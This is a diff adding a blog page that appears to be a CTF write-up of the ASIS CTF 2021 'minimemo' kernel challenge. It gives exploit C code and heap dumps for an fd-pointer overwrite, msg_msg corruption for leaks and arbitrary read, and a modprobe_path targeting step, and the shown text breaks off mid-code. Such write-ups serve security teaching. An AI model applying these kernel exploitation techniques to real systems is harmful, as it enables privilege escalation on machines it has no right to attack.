@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>asis ctf 2021 - minimemo | kileak</title>
+
+
+
+
+
+<meta name="description" content="asis ctf 2021 - minimemo">
+
+
+<meta name="keywords" content="asis, minimemo">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/asis21-minimemo/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">asis ctf 2021 - minimemo</h1>
+      <p class="post-meta">Oct 23, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>minimemo
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>Little notes for some little ideas.</p>
+
+  <p>nc 168.119.108.148 14010</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/asis21/minimemo/minimemo.tar.gz">minimemo.tar.gz</a> <a href="https://kileak.github.io/assets/asis21/minimemo/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/asis21/minimemo/pwn.c">pwn.c</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<p>minimemo was a heap note like kernel challenge, but it only allowed to <code class="language-plaintext highlighter-rouge">add</code>/<code class="language-plaintext highlighter-rouge">edit</code>/<code class="language-plaintext highlighter-rouge">delete</code> notes on the kernel, so no easy leaks here.</p>
+
+<p>The main bug for this challenge was in the edit function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">note_t</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">request_t</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">notelist_t</span>
+<span class="p">{</span>
+    <span class="n">note_t</span> <span class="n">note</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">notelist_t</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">notelist_t</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">notelist_t</span><span class="p">;</span>
+
+<span class="k">case</span> <span class="n">CMD_EDIT</span><span class="p">:</span>
+<span class="p">{</span>
+    <span class="n">notelist_t</span> <span class="o">*</span><span class="n">cur</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">cur</span> <span class="o">=</span> <span class="n">top</span><span class="p">.</span><span class="n">fd</span><span class="p">;</span> <span class="n">cur</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">top</span><span class="p">;</span> <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">id</span> <span class="o">==</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">.</span><span class="n">id</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="n">NOTE_SIZE</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>   <span class="c1">// overflow into next chunk possible (4 bytes)</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">id</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The edit function checks the size of our requests, but compares it with <code class="language-plaintext highlighter-rouge">NOTE_SIZE</code> (which will be <code class="language-plaintext highlighter-rouge">0x18</code>), but the <code class="language-plaintext highlighter-rouge">note.data</code> field has only a size of <code class="language-plaintext highlighter-rouge">0x14</code>, so we can overwrite 4 bytes after <code class="language-plaintext highlighter-rouge">note.data</code>.</p>
+
+<p>But in our <code class="language-plaintext highlighter-rouge">request</code>, we’ll need to specify the data to copy in the first <code class="language-plaintext highlighter-rouge">0x14</code> bytes followed by the <code class="language-plaintext highlighter-rouge">id</code> of the note to edit. This means, we can overwrite the bytes after <code class="language-plaintext highlighter-rouge">note.data</code> only with the <code class="language-plaintext highlighter-rouge">id</code> from the note itself.</p>
+
+<p>After <code class="language-plaintext highlighter-rouge">note.data</code> will be <code class="language-plaintext highlighter-rouge">cur-&gt;fd</code>, so we can overwrite the lower 4 bytes of the <code class="language-plaintext highlighter-rouge">fd</code> pointer to point somewhere else (for now just with the <code class="language-plaintext highlighter-rouge">id</code> of the note).</p>
+
+<p>Since we have no kernel leaks by now, the best idea would be to arrange some objects in such a way, that we only need to overwrite the LSB of the <code class="language-plaintext highlighter-rouge">fd</code> pointer to point it to somewhere useful.</p>
+
+<p>To get an initial leak, I created two notes and a <code class="language-plaintext highlighter-rouge">msg_seq</code> struct behind the second note (by creating an oversized <code class="language-plaintext highlighter-rouge">msg_msg</code>).</p>
+
+<p>To get a proper value for overwriting <code class="language-plaintext highlighter-rouge">cur-&gt;fd</code>, I kept deleting and recreating the second note until the LSB of its <code class="language-plaintext highlighter-rouge">id</code> matched the target address byte.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span><span class="o">*</span> <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mh">0x1337000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>    
+<span class="p">}</span>
+    
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">((</span><span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc0</span><span class="p">)</span> <span class="p">{</span>            
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Good key: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">dodel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">);</span>
+
+<span class="n">lptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mh">0xfd0</span><span class="o">+</span><span class="mh">0x30</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]);</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1337000</span><span class="p">;</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1337100</span><span class="p">;</span>
+
+<span class="c1">// Create msg_seq behind second note</span>
+<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0xfd0</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
+
+<span class="c1">// Overwrite lsb of note2-&gt;fd</span>
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mh">0x15</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+<span class="c1">// delete msg_msg seq to trigger unlink into mapped region</span>
+<span class="n">dodel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span></code></pre></figure>
+
+<p>The last edit, will overwrite the LSB of the <code class="language-plaintext highlighter-rouge">fd</code> pointer with <code class="language-plaintext highlighter-rouge">0xc0</code> (from our forged id). This way, <code class="language-plaintext highlighter-rouge">note2-&gt;fd</code> will point to the <code class="language-plaintext highlighter-rouge">msg_seq</code> struct. In the <code class="language-plaintext highlighter-rouge">msg_seq</code> struct, I prepared a <code class="language-plaintext highlighter-rouge">fd</code>/<code class="language-plaintext highlighter-rouge">bk</code> pointer, pointing into an mmapped region, so the <code class="language-plaintext highlighter-rouge">unlink</code> from <code class="language-plaintext highlighter-rouge">CMD_DEL</code> will not crash (it just needs two valid pointers).</p>
+
+<p>Since the first qword of the <code class="language-plaintext highlighter-rouge">msg_seq</code> struct will be <code class="language-plaintext highlighter-rouge">0x0</code>, we can then delete the note with id <code class="language-plaintext highlighter-rouge">0x0</code> (delete will traverse the node list, and since we corrupted the <code class="language-plaintext highlighter-rouge">fd</code> pointer to the <code class="language-plaintext highlighter-rouge">msg_seq</code> struct, it will try to delete that and unlink it from the note list).</p>
+
+<p>After forging note 2 with a proper id and allocating <code class="language-plaintext highlighter-rouge">msg_seq</code> heap looks like</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e8f880:	0x0000000031b42bc0	0x0000000000000000 &lt;= note 2 (LSB id ending in 0xc0)
+0xffff888002e8f890:	0x0000000000000000	0xffff888002e8f840 &lt;= note 2 FD
+0xffff888002e8f8a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e8f8b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e8f8c0:	0x0000000000000000	0x4141414141414141 &lt;= msg_seq
+0xffff888002e8f8d0:	0x4141414141414141	0x0000000001337000 &lt;= fake FD
+0xffff888002e8f8e0:	0x0000000001337100	0x4141414141414141 &lt;= fake BK
+0xffff888002e8f8f0:	0x4141414141414141	0x0000000000000000
+0xffff888002e8f900:	0x0000000000000024	0x0000003200000029
+0xffff888002e8f910:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>After overwriting the LSB of <code class="language-plaintext highlighter-rouge">note2-&gt;fd</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e8f880:	0x4141414131b42bc0	0x4141414141414141 &lt;= note 2
+0xffff888002e8f890:	0x4141414141414141	0xffff888002e8f8c0 &lt;= note 2 FD (now pointing to msg_seq)
+0xffff888002e8f8a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e8f8b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e8f8c0:	0x0000000000000000	0x4141414141414141 &lt;= msg_seq (fake note with id 0x0)
+0xffff888002e8f8d0:	0x4141414141414141	0x0000000001337000
+0xffff888002e8f8e0:	0x0000000001337100	0x4141414141414141
+0xffff888002e8f8f0:	0x4141414141414141	0x0000000000000000</code></pre></figure>
+
+<p>After deleting the note with id <code class="language-plaintext highlighter-rouge">0x0</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e8f880:	0x4141414131b42bc0	0x4141414141414141 &lt;= note 2
+0xffff888002e8f890:	0x4141414141414141	0xffff888002e8f8c0
+0xffff888002e8f8a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e8f8b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e8f8c0:	0x0000000000000000	0x4141414141414141 &lt;= msg_seq
+0xffff888002e8f8d0:	0x4141414141414141	0x0000000001337000
+0xffff888002e8f8e0:	0xffff888002e8f900	0x4141414141414141 &lt;= updated bk pointer from CMD_DEL
+0xffff888002e8f8f0:	0x4141414141414141	0x0000000000000000
+0xffff888002e8f900:	0x0000000000000024	0x0000003200000029</code></pre></figure>
+
+<p>The unlink functionality from <code class="language-plaintext highlighter-rouge">CMD_DEL</code> now updated the <code class="language-plaintext highlighter-rouge">bk</code> pointer of our fake chunk.</p>
+
+<p>We can now just receive the complete <code class="language-plaintext highlighter-rouge">msg_msg</code> again and get the first leak from it :)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// receive msg for kernel heap leak</span>
+<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0xfd0</span><span class="o">+</span><span class="mh">0x40</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kleak</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mh">0xff0</span><span class="p">]));</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"kernel leak     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kleak</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">kernel leak     : 0xffff888002e8f900</code></pre></figure>
+
+<p>Having a leak to the note heap itself gives us more control, since we can now overwrite complete addresses. To have something useful on the note heap to begin with, I just did a <code class="language-plaintext highlighter-rouge">shmem</code> spray to get some kernel addresses there (preferably an address in the same memory region as <code class="language-plaintext highlighter-rouge">modprobe_path</code>).</p>
+
+<p>After that, I used the fd lsb overwrite again, but this time, I let the <code class="language-plaintext highlighter-rouge">fd</code> pointer point into the note itself, so that we can overwrite the complete <code class="language-plaintext highlighter-rouge">fd</code> pointer with an arbitrary value.</p>
+
+<p>Though manipulating the <code class="language-plaintext highlighter-rouge">fd</code> pointer alone will not help us much, since we cannot <code class="language-plaintext highlighter-rouge">show</code> notes, so we cannot use it to “directly” leak something.</p>
+
+<p>For this, I also put a <code class="language-plaintext highlighter-rouge">msg_msg</code> struct in the same heap, and then used the arbitrary overwrite to point the <code class="language-plaintext highlighter-rouge">fd</code> of the note into the <code class="language-plaintext highlighter-rouge">msg_msg</code> struct, so we can overwrite <code class="language-plaintext highlighter-rouge">msg_size</code> and <code class="language-plaintext highlighter-rouge">msg_next</code>. With this we can then do an arbitrary read (by pointing <code class="language-plaintext highlighter-rouge">msg_next</code> to an address near the address we want to read and setting <code class="language-plaintext highlighter-rouge">msg_size</code> &gt; <code class="language-plaintext highlighter-rouge">0xfd0</code>).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe_target</span> <span class="o">=</span> <span class="n">kleak</span> <span class="o">-</span> <span class="mh">0x198</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"modprobe_target: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_target</span><span class="p">);</span>
+
+<span class="c1">// put shmem structs on the note heap</span>
+<span class="n">spray_shmem</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+
+<span class="n">dodel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+<span class="c1">// recreate second note until LSB would point into note itself</span>
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">((</span><span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x90</span><span class="p">)</span> <span class="p">{</span>            
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Good key: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">dodel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// overwrite fd lsb with id lsb</span>
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mh">0x15</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+<span class="c1">// allocate msg_msg behind note</span>
+<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+
+<span class="c1">// prepare payload to overwrite note 2 fd</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+<span class="n">lptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+<span class="o">*</span><span class="n">lptr</span> <span class="o">=</span> <span class="n">kleak</span><span class="o">-</span><span class="mh">0x30</span><span class="p">;</span>    <span class="c1">// points into msg_msg struct</span>
+
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mh">0x4</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>     
+
+<span class="c1">// prepare payload to overwrite msg_msg</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+<span class="n">lptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x2000</span><span class="p">;</span>              <span class="c1">// msg_size</span>
+<span class="p">(</span><span class="o">*</span><span class="n">lptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">modprobe_target</span><span class="o">-</span><span class="mi">8</span><span class="p">;</span>   <span class="c1">// msg_next</span>
+
+<span class="n">doedit</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x4</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+<span class="c1">// receive corrupted msg_msg for leak    </span>
+<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe_leak</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mh">0xfd8</span><span class="p">]));</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe</span> <span class="o">=</span> <span class="n">modprobe_leak</span> <span class="o">-</span> <span class="mh">0x7bfe0</span><span class="p">;</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"modprobe leak   : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_leak</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"modprobe        : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe</span><span class="p">);</span></code></pre></figure>
+
+<p>Let’s see, what happens there…</p>
+
+<p>After recreating note2 with a proper id:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e99880:	0x000000005e3cef90	0x0000000000000000  &lt;= note 2 (lsb 0x90)
+0xffff888002e99890:	0x0000000000000000	0xffff888002e998c0
+0xffff888002e998a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e998b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e998c0:	0x0000000000000000	0x4141414141414141
+0xffff888002e998d0:	0x4141414141414141	0x0000000001337000
+0xffff888002e998e0:	0xffff888002e99880	0x4141414141414141
+0xffff888002e998f0:	0x4141414141414141	0x0000000000000000</code></pre></figure>
+
+<p>After overwriting the <code class="language-plaintext highlighter-rouge">fd</code> of note 2 with <code class="language-plaintext highlighter-rouge">0x90</code> and allocating another <code class="language-plaintext highlighter-rouge">msg_msg</code>:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e99880:	0x000000015e3cef90	0x4141414100000000  &lt;= note 2
+0xffff888002e99890:	0x4141414141414141	0xffff888002e99890  &lt;= note 2 fd (=&gt; points to note2+0x10)
+0xffff888002e998a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e998b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e998c0:	0xffff888002e95cc0	0xffff888002e95cc0  &lt;= msg_msg
+0xffff888002e998d0:	0x0000000000000001	0x0000000000000010
+0xffff888002e998e0:	0x0000000000000000	0x0000000000000000
+0xffff888002e998f0:	0x4141414141414141	0x4141414141414141
+0xffff888002e99900:	0x0000000000000000	0x0000000000000000
+0xffff888002e99910:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>After the next edit of note 2, we will have the <code class="language-plaintext highlighter-rouge">fd</code> overwritten with a pointer into the <code class="language-plaintext highlighter-rouge">msg_msg</code> struct.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e99880:	0x000000015e3cef90	0x4141414100000000  &lt;= note 2
+0xffff888002e99890:	0x0000000041414141	0xffff888002e998d0  &lt;= note 2 fd (=&gt; now points into msg_msg)
+0xffff888002e998a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e998b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e998c0:	0xffff888002e95cc0	0xffff888002e95cc0  &lt;= msg_msg
+0xffff888002e998d0:	0x0000000000000001	0x0000000000000010  &lt;= id / msg_size
+0xffff888002e998e0:	0x0000000000000000	0x0000000000000000  &lt;= msg_next
+0xffff888002e998f0:	0x4141414141414141	0x4141414141414141</code></pre></figure>
+
+<p>So, we now have a fake note inside <code class="language-plaintext highlighter-rouge">msg_msg</code> with <code class="language-plaintext highlighter-rouge">id = 0x1</code>. We can now edit this fake note to overwrite <code class="language-plaintext highlighter-rouge">msg_size</code> and <code class="language-plaintext highlighter-rouge">msg_next</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888002e99880:	0x000000015e3cef90	0x4141414100000000  &lt;= note 2
+0xffff888002e99890:	0x0000000041414141	0xffff888002e998d0
+0xffff888002e998a0:	0xffffffffc0002100	0x0000000000000000
+0xffff888002e998b0:	0x0000000000000000	0x0000000000000000
+0xffff888002e998c0:	0xffff888002e95cc0	0xffff888002e95cc0  &lt;= msg_msg
+0xffff888002e998d0:	0x0000000000000001	0x0000000000002000  &lt;= id / msg_size (now 0x2000)
+0xffff888002e998e0:	0xffff888002e99760	0x0000000000000000  &lt;= msg_next (=&gt; leaking address)
+0xffff888002e998f0:	0x4141414141414141	0x4141414141414141
+0xffff888002e99900:	0x0000000000000000	0x0000000000000000
+
+gef➤  x/30gx 0xffff888002e99760
+0xffff888002e99760:	0x0000000000000000	0xffffffff81eb27a0  &lt;= fake msg_seq
+0xffff888002e99770:	0xffff888002ec7080	0x0000000300000001
+0xffff888002e99780:	0xffffffff81d0d184	0xffff888002e99788
+0xffff888002e99790:	0xffff888002e99788	0xffffffffc0002190
+0xffff888002e997a0:	0x0000000000000000	0xffffffff81eb27a0
+0xffff888002e997b0:	0xffff888002ebf100	0x0000000300000001</code></pre></figure>
+
+<p>So we now have a fake <code class="language-plaintext highlighter-rouge">msg_msg</code>, which has a <code class="language-plaintext highlighter-rouge">msg_seq</code>, which points to an address, which will be in the same memory region as <code class="language-plaintext highlighter-rouge">modprobe_path</code>, perfect :)</p>
+
+<p>Just receive the complete message:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">modprobe leak   : 0xffffffff81eb27a0
+modprobe        : 0xffffffff81e367c0</code></pre></figure>
+
+<p>Now, we can abuse the lsb <code class="language-plaintext highlighter-rouge">fd</code> overwrite one last time to overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer of a note with a pointer above <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>
+
+<p>This time, I moved it a bit, so that the <code class="language-plaintext highlighter-rouge">fd</code> pointer of the note will point to <code class="language-plaintext highlighter-rouge">note + 0xc</code>. By doing this, we can overwrite the <code class="language-plaintext highlighter-rouge">id</code> of the note and the <code class="language-plaintext highlighter-rouge">fd</code> pointer in one go (it must not have an id of 0x0, since that will be the id of our precious modprobe chunk).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Trying to fix remote issues ;)</span>
+<span class="n">key</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">donew</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
